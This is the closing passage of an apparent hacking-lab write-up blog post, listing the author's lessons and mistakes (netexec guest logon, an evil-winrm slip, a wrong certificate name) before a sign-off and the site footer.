<li>I learned about netexec displaying <code>guest</code> when a random username and password is supplied as a way to show that guest logon is accepted on the target.</li>
<li>I learned to always re-check my tools. That mistake with <code>evil-winrm</code> was silly.</li>
</ol>
<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
<ol>
<li>See point 3 above.</li>
<li>Oh I also tried to use the wrong certificate name when initially doing the exploit, copy &amp; paste always!</li>
</ol>
<h2 id="sign-off">Sign off:</h2>
<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
<p>Until next time, hack the planet!</p>
<p>– Bloodstiller</p>
<p>– Get in touch bloodstiller at proton dot me</p>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ®.</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        5189
                    
                </li>
            

            
            

            
                <li>en</li>
            

            
                <li>
                    <a href="https://gohugo.io" class="btn" target="_blank"
                        >Hugo: 0.135.0</a
                    >
                </li>
            

            
                <li>
                    <a
                        href="https://github.com/JingWangTW/dark-theme-editor"
                        class="btn"
                        target="_blank"
                        >Theme: dark-theme-editor</a
                    >
                </li>
            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Oct 05 2024 00:00:00
                        </time>
                    
                </li>
            

            
                <li title="">
                    
                </li>
            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/custom.baf1622c95b2ed38ea638ca259c323d2a5537d258fb923994e97539b4c4ecf706c7992482768366adddcb83153dce8c33f5fc95a5c8abe6b2a03046892509fae.js"
            integrity="sha512-uvFiLJWy7TjqY4yiWcMj0qVTfSWPuSOZTpdTm0xOz3BseZJIJ2g2at3cuDFT3OjDP1/JWlyKvmsqAwRoklCfrg=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
